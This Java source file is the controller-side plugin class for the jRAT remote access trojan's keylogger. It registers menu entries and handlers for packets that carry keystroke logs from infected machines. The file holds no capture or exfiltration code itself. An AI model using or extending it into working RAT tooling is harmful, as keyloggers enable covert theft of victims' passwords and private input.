package jrat.plugin.keylogger.client;

import jrat.api.Icons;
import jrat.api.Plugin;
import jrat.api.net.Packet;
import jrat.api.ui.RATControlMenuEntry;
import jrat.api.ui.RATMenuItem;
import jrat.plugin.keylogger.client.ui.PanelKeylogger;

public class KeyloggerPlugin extends Plugin {

	public static final short STATUS_HEADER = 123;
	public static final short LOGS_HEADER = 124;
	public static final short LOG_HEADER = 125;
	
	public static RATControlMenuEntry entry;
	
	public boolean enabled;

	public KeyloggerPlugin() {
		super("Keylogger", "1.2.1", "Keylogger Plugin", "jRAT", Icons.getIcon("Keylogger", "/icons/icon.png"));
		
		entry = new RATControlMenuEntry("Keylogger", icon, PanelKeylogger.class);
		RATControlMenuEntry.addEntry(entry);
		
		RATMenuItem item = new RATMenuItem(new MenuListener(), "Keylogger", icon);
		RATMenuItem.addItem(item);
		
		Packet.registerIncoming(STATUS_HEADER, new PacketStatus());
		Packet.registerIncoming(LOGS_HEADER, new PacketLogs());
		Packet.registerIncoming(LOG_HEADER, new PacketLog());
	}
}
